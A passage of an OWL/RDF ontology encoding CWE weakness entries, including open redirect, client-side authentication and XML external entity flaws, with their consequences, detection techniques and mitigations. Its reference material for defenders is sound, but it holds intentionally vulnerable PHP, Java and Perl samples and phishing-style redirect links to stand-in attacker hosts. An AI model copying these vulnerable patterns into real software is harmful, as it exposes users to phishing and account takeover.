     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Bypass Protection Mechanism"^^xsd:string,
     integrity  "Modify Files or Directories"^^xsd:string,
     integrity  "Read Files or Directories"^^xsd:string,
     likelihood_of_exploit  "Medium"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Often Prevalent"^^xsd:string
                 
                 operating_system  "Unix"^^xsd:string,
     
     Annotations: rdfs:comment "Sometimes Prevalent"^^xsd:string
                 
                 operating_system  "Windows"^^xsd:string,
     
     Annotations: rdfs:comment "Windows simple shortcuts, sometimes referred to as soft links, can be exploited remotely since a \".LNK\" file can be uploaded like a normal file. This can enable remote execution."^^xsd:string
                 
                 other  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis - Binary or Bytecode

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Bytecode Weakness Analysis - including disassembler + source code weakness analysis
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Source code Weakness Analyzer
Context-configured Source Code Weakness Analyzer
Effectiveness: SOAR Partial"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis - Binary or Bytecode

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code

According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Focused Manual Spotcheck - Focused manual analysis of source
Manual Source Code Review (not inspections)
Effectiveness: High"^^xsd:string
                 
                 static  "manual"^^xsd:string,
     weakness_ordinalities  "Resultant"^^xsd:string
    
    
Individual: CWE-601_URL_Redirection_to_Untrusted_Site

    Annotations: 
        rdfs:comment "A web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a Redirect. This simplifies phishing attacks."^^xsd:string,
        rdfs:comment "Alternate Terms:
Open Redirect	
Cross-site Redirect	
Cross-domain Redirect"^^xsd:string,
        rdfs:comment "An http parameter may contain a URL value and could cause the web application to redirect the request to the specified URL. By modifying the URL value to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials. Because the server name in the modified link is identical to the original site, phishing attempts have a more trustworthy appearance."^^xsd:string,
        rdfs:comment "Background Details:
Phishing is a general term for deceptive attempts to coerce private information from users that will be used for identity theft."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1019_Validate_Inputs,
     
     Annotations: rdfs:comment "URL parameter loads the URL into a frame and causes it to appear to be part of a valid page."^^xsd:string
                 
                 references  CVE-2005-4206,
     
     Annotations: rdfs:comment "Open redirect vulnerability in the software allows remote attackers to redirect users to arbitrary web sites and conduct phishing attacks via a URL in the proper parameter."^^xsd:string
                 
                 references  CVE-2008-2052,
     
     Annotations: rdfs:comment "An open redirect vulnerability in the search script in the software allows remote attackers to redirect users to arbitrary web sites and conduct phishing attacks via a URL as a parameter to the proper function."^^xsd:string
                 
                 references  CVE-2008-2951,
     ID  "601"^^xsd:positiveInteger,
     access_control  "Bypass Protection Mechanism"^^xsd:string,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     access_control  "Other"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Ensure that no externally-supplied requests are honored by requiring that all redirect requests include a unique nonce generated by the application. Be sure that the nonce is not predictable (CWE-330).
Note: Note that this can be bypassed using XSS (CWE-79)."^^xsd:string, 
                 rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string, 
                 rdfs:comment "Strategy: Attack Surface Reduction

Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.
Many open redirect problems occur because the programmer assumed that certain inputs could not be modified, such as cookies and hidden form fields."^^xsd:string, 
                 rdfs:comment "Strategy: Enforcement by Conversion

When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.
For example, ID 1 could map to \"/login.asp\" and ID 2 could map to \"http://www.example.com/\". Features such as the ESAPI AccessReferenceMap  provide this capability."^^xsd:string, 
                 rdfs:comment "Use an intermediate disclaimer page that provides the user with a clear warning that they are leaving the current site. Implement a long timeout before the redirect occurs, or force the user to click on the link. Be careful to avoid XSS problems (CWE-79) when generating the disclaimer page."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Formal Methods / Correct-By-Construction
Cost effective for partial coverage:
Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
Effectiveness: High"^^xsd:string
                 
                 architecture_or_design_review  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string, 
                 rdfs:comment "The user may be redirected to an untrusted page that contains malware which may then compromise the user's machine. This will expose the user to extensive risk and the user's interaction with the web server may also be compromised if the malware conducts keylogging or other attacks that steal credentials, personally identifiable information (PII), or other important data."^^xsd:string, 
                 rdfs:comment "The user may be subjected to phishing attacks by being redirected to an untrusted page. The phishing attack may point to an attacker controlled web page that appears to be a trusted web site. The phishers may then steal the user's credentials and then use these credentials to access the legitimate web site."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Bypass Protection Mechanism"^^xsd:string,
     confidentiality  "Gain Privileges or Assume Identity"^^xsd:string,
     confidentiality  "Other"^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
The following code obtains a URL from the query string and then redirects the user to that URL.

(bad code)
Example Language: PHP 
$redirect_url = $_GET['url'];
header(\"Location: \" . $redirect_url);
The problem with the above code is that an attacker could use this page as part of a phishing scam by redirecting users to a malicious site. For example, assume the above code is in the file example.php. An attacker could supply a user with the following link:

(attack code)
 
http://example.com/example.php?url=http://malicious.example.com
The user sees the link pointing to the original trusted site (example.com) and does not realize the redirection that could take place."^^xsd:string, 
                 rdfs:comment "Example 2
The following code is a Java servlet that will receive a GET request with a url parameter in the request to redirect the browser to the address specified in the url parameter. The servlet will retrieve the url parameter value from the request and send a response to redirect the browser to the url address.

(bad code)
Example Language: Java 
public class RedirectServlet extends HttpServlet {
protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
String query = request.getQueryString();
if (query.contains(\"url\")) {
String url = request.getParameter(\"url\");
response.sendRedirect(url);
}
}
}
The problem with this Java servlet code is that an attacker could use the RedirectServlet as part of a e-mail phishing scam to redirect users to a malicious site. An attacker could send an HTML formatted e-mail directing the user to log into their account by including in the e-mail the following link:

(attack code)
Example Language: HTML 
<a href=\"http://bank.example.com/redirect?url=http://attacker.example.net\">Click here to log in</a>
The user may assume that the link is safe since the URL starts with their trusted bank, bank.example.com. However, the user will then be redirected to the attacker's web site (attacker.example.net) which the attacker may have made to appear very similar to bank.example.com. The user may then unwittingly enter credentials into the attacker's web page and compromise their bank account. A Java servlet should never redirect a user to a URL without verifying that the redirect address is a trusted site."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Analysis

Automated black box tools that supply URLs to every input may be able to spot Location header modifications, but test case coverage is a factor, and custom redirects may not be detected."^^xsd:string, 
                 rdfs:comment "Analysis with Automated Results Interpretation

According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Web Application Scanner
Web Services Scanner
Database Scanners
Effectiveness: High"^^xsd:string
                 
                 dynamic  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis with Manual Results Interpretation

According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Fuzz Tester
Framework-based Fuzzer
Effectiveness: High"^^xsd:string
                 
                 dynamic  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Attack Surface Reduction

Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.
Many open redirect problems occur because the programmer assumed that certain inputs could not be modified, such as cookies and hidden form fields."^^xsd:string, 
                 rdfs:comment "Strategy: Input Validation

Assume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.
When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"
Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
Use a whitelist of approved URLs or domains to be used for redirection."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     likelihood_of_exploit  "Low"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Firewall

Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.
Effectiveness: Moderate

Note: An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization."^^xsd:string
                 
                 operation  ""^^xsd:string,
     other  "Bypass Protection Mechanism"^^xsd:string,
     other  "Gain Privileges or Assume Identity"^^xsd:string,
     other  "Other"^^xsd:string,
     paradigms  "Web Based"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis

Automated static analysis tools may not be able to determine whether input influences the beginning of a URL, which is important for reducing false positives."^^xsd:string, 
                 rdfs:comment "Analysis - Binary or Bytecode

According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Bytecode Weakness Analysis - including disassembler + source code weakness analysis
Binary Weakness Analysis - including disassembler + source code weakness analysis
Effectiveness: High"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code

According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Source code Weakness Analyzer
Context-configured Source Code Weakness Analyzer
Effectiveness: High"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis

Since this weakness does not typically appear frequently within a single software package, manual white box techniques may be able to provide sufficient code coverage and reduction of false positives if all potentially-vulnerable operations can be assessed within limited time constraints.
Effectiveness: High"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code

According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Manual Source Code Review (not inspections)
Effectiveness: High"^^xsd:string
                 
                 static  "manual"^^xsd:string
    
    
Individual: CWE-602_Client-Side_Enforcement_of_Server-Side_Security

    Annotations: 
        rdfs:comment "Research Gap:
Server-side enforcement of client-side security is conceptually likely to occur, but some architectures might have these strong dependencies as part of legitimate behavior, such as thin clients."^^xsd:string,
        rdfs:comment "The software is composed of a server that relies on the client to implement a mechanism that is intended to protect the server."^^xsd:string,
        rdfs:comment "When the server relies on protection mechanisms placed on the client side, an attacker can modify the client-side behavior to bypass the protection mechanisms resulting in potentially unexpected interactions between the client and server. The consequences will vary, depending on what the mechanisms are trying to protect."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1012_Cross_Cutting,
     
     Annotations: rdfs:comment "ASP program allows upload of .asp files by bypassing client-side checks."^^xsd:string
                 
                 references  CVE-2006-6994,
     
     Annotations: rdfs:comment "client allows server to modify client's configuration and overwrite arbitrary files."^^xsd:string
                 
                 references  CVE-2007-0100,
     
     Annotations: rdfs:comment "steganography products embed password information in the carrier file, which can be extracted from a modified client."^^xsd:string
                 
                 references  CVE-2007-0163,
     
     Annotations: rdfs:comment "steganography products embed password information in the carrier file, which can be extracted from a modified client."^^xsd:string
                 
                 references  CVE-2007-0164,
     
     Annotations: rdfs:comment "Privilege Abuse"^^xsd:string
                 
                 related_attack_patterns  CAPEC-122,
     
     Annotations: rdfs:comment "Manipulating Hidden Fields"^^xsd:string
                 
                 related_attack_patterns  CAPEC-162,
     
     Annotations: rdfs:comment "Create Malicious Client"^^xsd:string
                 
                 related_attack_patterns  CAPEC-202,
     
     Annotations: rdfs:comment "Removing Important Client Functionality"^^xsd:string
                 
                 related_attack_patterns  CAPEC-207,
     
     Annotations: rdfs:comment "Removing/short-circuiting 'Purse' logic: removing/mutating 'cash' decrements"^^xsd:string
                 
                 related_attack_patterns  CAPEC-208,
     
     Annotations: rdfs:comment "Exploitation of Trusted Credentials"^^xsd:string
                 
                 related_attack_patterns  CAPEC-21,
     
     Annotations: rdfs:comment "Accessing/Intercepting/Modifying HTTP Cookies"^^xsd:string
                 
                 related_attack_patterns  CAPEC-31,
     
     Annotations: rdfs:comment "Harvesting Information via API Event Monitoring"^^xsd:string
                 
                 related_attack_patterns  CAPEC-383,
     
     Annotations: rdfs:comment "Application API Message Manipulation via Man-in-the-Middle"^^xsd:string
                 
                 related_attack_patterns  CAPEC-384,
     
     Annotations: rdfs:comment "Transaction or Event Tampering via Application API Manipulation"^^xsd:string
                 
                 related_attack_patterns  CAPEC-385,
     
     Annotations: rdfs:comment "Application API Navigation Remapping"^^xsd:string
                 
                 related_attack_patterns  CAPEC-386,
     
     Annotations: rdfs:comment "Navigation Remapping To Propagate Malicious Content"^^xsd:string
                 
                 related_attack_patterns  CAPEC-387,
     
     Annotations: rdfs:comment "Application API Button Hijacking"^^xsd:string
                 
                 related_attack_patterns  CAPEC-388,
     
     Annotations: rdfs:comment "Content Spoofing Via Application API Manipulation"^^xsd:string
                 
                 related_attack_patterns  CAPEC-389,
     ID  "602"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "Client-side checks for authentication can be easily bypassed, allowing clients to escalate their access levels and perform unintended actions."^^xsd:string, 
                 rdfs:comment "Client-side validation checks can be easily bypassed, allowing malformed or unexpected input to pass into the application, potentially as trusted data. This may lead to unexpected states, behaviors and possibly a resulting crash."^^xsd:string
                 
                 access_control  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "Client-side checks for authentication can be easily bypassed, allowing clients to escalate their access levels and perform unintended actions."^^xsd:string
                 
                 access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Consider a product that consists of two or more processes or nodes that must interact closely, such as a client/server model. If the product uses protection schemes in the client in order to defend from attacks against the server, and the server does not use the same schemes, then an attacker could modify the client in a way that bypasses those schemes. This is a fundamental design flaw that is primary to many weaknesses."^^xsd:string, 
                 rdfs:comment "For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.
Even though client-side checks provide minimal benefits with respect to server-side security, they are still useful. First, they can support intrusion detection. If the server receives input that should have been rejected by the client, then it may be an indication of an attack. Second, client-side error-checking can provide helpful feedback to the user about the expectations for valid input. Third, there may be a reduction in server-side processing time for accidental input errors, although this is typically a small savings."^^xsd:string, 
                 rdfs:comment "If some degree of trust is required between the two entities, then use integrity checking and strong authentication to ensure that the inputs are coming from a trusted source. Design the product so that this trust is managed in a centralized fashion, especially if there are complex or numerous communication channels, in order to reduce the risks that the implementer will mistakenly omit a check in a single code path."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "Client-side validation checks can be easily bypassed, allowing malformed or unexpected input to pass into the application, potentially as trusted data. This may lead to unexpected states, behaviors and possibly a resulting crash."^^xsd:string
                 
                 availability  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "This example contains client-side code that checks if the user authenticated successfully before sending a command. The server-side code performs the authentication in one step, and executes the command in a separate step.

CLIENT-SIDE (client.pl)

(good code)
Example Language: Perl 
$server = \"server.example.com\";
$username = AskForUserName();
$password = AskForPassword();
$address = AskForAddress();
$sock = OpenSocket($server, 1234);
writeSocket($sock, \"AUTH $username $password\\n\");
$resp = readSocket($sock);
if ($resp eq \"success\") {

# username/pass is valid, go ahead and update the info! 
writeSocket($sock, \"CHANGE-ADDRESS $username $address\\n\";
}
else {
print \"ERROR: Invalid Authentication!\\n\";
}
SERVER-SIDE (server.pl):

(bad code)
 $sock = acceptSocket(1234);
($cmd, $args) = ParseClientRequest($sock);
if ($cmd eq \"AUTH\") {
($username, $pass) = split(/\\s+/, $args, 2);
$result = AuthenticateUser($username, $pass);
writeSocket($sock, \"$result\\n\");
# does not close the socket on failure; assumes the 

# user will try again 
}
elsif ($cmd eq \"CHANGE-ADDRESS\") {
if (validateAddress($args)) {
$res = UpdateDatabaseRecord($username, \"address\", $args);
writeSocket($sock, \"SUCCESS\\n\");
}
else {
writeSocket($sock, \"FAILURE -- address is malformed\\n\");
}
}
The server accepts 2 commands, \"AUTH\" which authenticates the user, and \"CHANGE-ADDRESS\" which updates the address field for the username. The client performs the authentication and only sends a CHANGE-ADDRESS for that user if the authentication succeeds. Because the client has already performed the authentication, the server assumes that the username in the CHANGE-ADDRESS is the same as the authenticated user. An attacker could modify the client by removing the code that sends the \"AUTH\" command and simply executing the CHANGE-ADDRESS."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     likelihood_of_exploit  "Medium"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Sometimes Prevalent"^^xsd:string
                 
                 paradigms  "Client Server"^^xsd:string,
     
     Annotations: rdfs:comment "Use dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results."^^xsd:string, 
                 rdfs:comment "Use tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules."^^xsd:string
                 
                 testing  ""^^xsd:string,
     
     Annotations: rdfs:comment "where the weakness exists independent of other weaknesses"^^xsd:string
                 
                 weakness_ordinalities  "Primary"^^xsd:string
    
    
Individual: CWE-603_Use_of_Client-Side_Authentication

    Annotations: 
        rdfs:comment "A client/server product performs authentication within client code but not in server code, allowing server-side authentication to be bypassed via a modified client that omits the authentication check."^^xsd:string,
        rdfs:comment "Client-side authentication is extremely weak and may be breached easily. Any attacker may read the source code and reverse-engineer the authentication mechanism to access parts of the application which would otherwise be protected."^^xsd:string,
        rdfs:comment "Maintenance
Note that there is a close relationship between this weakness and CWE-656 (Reliance on Security through Obscurity). If developers do not believe that a user can reverse engineer a client, then they are more likely to choose client-side authentication in the belief that it is safe."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1010_Authenticate_Actors,
     references  CVE-2006-0230,
     ID  "603"^^xsd:positiveInteger,
     access_control  "Bypass Protection Mechanism"^^xsd:string,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Do not rely on client side data. Always perform server side authentication."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-610_Externally_Controlled_Reference_to_a_Resource_in_Another_Sphere

    Annotations: 
        rdfs:comment "Maintenance:
The relationship between CWE-99 and CWE-610 needs further investigation and clarification. They might be duplicates. CWE-99 \"Resource Injection,\" as originally defined in Seven Pernicious Kingdoms taxonomy, emphasizes the \"identifier used to access a system resource\" such as a file name or port number, yet it explicitly states that the \"resource injection\" term does not apply to \"path manipulation,\" which effectively identifies the path at which a resource can be found and could be considered to be one aspect of a resource identifier. Also, CWE-610 effectively covers any type of resource, whether that resource is at the system layer, the application layer, or the code layer."^^xsd:string,
        rdfs:comment "Relationship:
This is a general class of weakness, but most research is focused on more specialized cases, such as path traversal (CWE-22) and symlink following (CWE-61). A symbolic link has a name; in general, it appears like any other file in the file system. However, the link includes a reference to another file, often in another directory - perhaps in another sphere of control. Many common library functions that accept filenames will \"follow\" a symbolic link and use the link's target instead."^^xsd:string,
        rdfs:comment "The product uses an externally controlled name or reference that resolves to a resource that is outside of the intended control sphere."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1015_Limit_Access,
     
     Annotations: rdfs:comment "XML Routing Detour Attacks"^^xsd:string
                 
                 related_attack_patterns  CAPEC-219,
     ID  "610"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Modify Application Data"^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     integrity  "Modify Application Data"^^xsd:string,
     integrity  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-611_Improper_Restriction_of_XML_External_Entity_Reference

    Annotations: 
        rdfs:comment "Alternate Terms:
XXE:	
XXE is an acronym used for the term \"XML eXternal Entities\""^^xsd:string,
        rdfs:comment "Relationship:
CWE-918 (SSRF) and CWE-611 (XXE) are closely related, because they both involve web-related technologies and can launch outbound requests to unexpected destinations. However, XXE can be performed client-side, or in other contexts in which the software is not acting directly as a server, so the \"Server\" portion of the SSRF acronym does not necessarily apply."^^xsd:string,
        rdfs:comment "The software processes an XML document that can contain XML entities with URIs that resolve to documents outside of the intended sphere of control, causing the product to embed incorrect documents into its output."^^xsd:string,
        rdfs:comment "XML documents optionally contain a Document Type Definition (DTD), which, among other features, enables the definition of XML entities. It is possible to define an entity by providing a substitution string in the form of a URI. The XML parser can access the contents of this URI and embed these contents back into the XML document for further processing.

By submitting an XML file that defines an external entity with a file:// URI, an attacker can cause the processing application to read the contents of a local file. For example, a URI such as \"file:///c:/winnt/win.ini\" designates (in Windows) the file C:\\Winnt\\win.ini, or file:///etc/passwd designates the password file in Unix-based systems. Using URIs with other schemes such as http://, the attacker can force the application to make outgoing requests to servers that the attacker cannot reach directly, which can be used to bypass firewall restrictions or hide the source of attacks such as port scanning.

Once the content of the URI is read, it is fed back into the application that is processing the XML. This application may echo back the data (e.g. in an error message), thereby exposing the file contents."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1015_Limit_Access,
     references  CVE-2005-1306,
     references  CVE-2009-1699,
     references  CVE-2010-3322,
     references  CVE-2011-4107,
     references  CVE-2012-0037,
     references  CVE-2012-2239,
     references  CVE-2012-3363,
     references  CVE-2012-3489,
     references  CVE-2012-4399,
     references  CVE-2012-5656,
     
     Annotations: rdfs:comment "XML External Entities Blowup"^^xsd:string
                 
                 related_attack_patterns  CAPEC-221,
     ID  "611"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "The software could consume excessive CPU cycles or memory using a URI that points to a large file, or a device that always returns data such as /dev/random. Alternately, the URI could reference a file that contains many nested or recursive entity references to further slow down parsing."^^xsd:string
                 
                 availability  "DoS: Resource Consumption (CPU)"^^xsd:string,
     
     Annotations: rdfs:comment "The software could consume excessive CPU cycles or memory using a URI that points to a large file, or a device that always returns data such as /dev/random. Alternately, the URI could reference a file that contains many nested or recursive entity references to further slow down parsing."^^xsd:string
                 
                 availability  "DoS: Resource Consumption (Memory)"^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "If the attacker is able to include a crafted DTD and a default entity resolver is enabled, the attacker may be able to access arbitrary files on the system."^^xsd:string
                 
                 confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "If the attacker is able to include a crafted DTD and a default entity resolver is enabled, the attacker may be able to access arbitrary files on the system."^^xsd:string
                 
                 confidentiality  "Read Files or Directories"^^xsd:string,
     
     Annotations: rdfs:comment "Many XML parsers and validators can be configured to disable external entity expansion."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The DTD may include arbitrary HTTP requests that the server may execute. This could lead to other attacks leveraging the server's trust relationship with other entities."^^xsd:string
                 
                 integrity  "Bypass Protection Mechanism"^^xsd:string,
     languages  "XML"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     paradigms  "Web Based"^^xsd:string,
     
     Annotations: rdfs:comment "Many XML parsers and validators can be configured to disable external entity expansion."^^xsd:string
                 
                 system_configuration  ""^^xsd:string
    
    
Individual: CWE-613_Insufficient_Session_Expiration

    Annotations: 
        rdfs:comment "According to WASC, \"Insufficient Session Expiration is when a web site permits an attacker to reuse old session credentials or session IDs for authorization.\""^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1018_Manage_User_Sessions,
     ID  "613"^^xsd:positiveInteger
    
    
Individual: CWE-620_Unverified_Password_Change

    Annotations: 
        rdfs:comment "This could be used by an attacker to change passwords for another user, thus gaining the privileges associated with that user."^^xsd:string,
        rdfs:comment "When setting a new password for a user, the product does not require knowledge of the original password, or using another form of authentication."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1010_Authenticate_Actors,
     references  CVE-2000-0944,
     references  CVE-2007-0681,
     ID  "620"^^xsd:positiveInteger,
     access_control  "Bypass Protection Mechanism"^^xsd:string,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
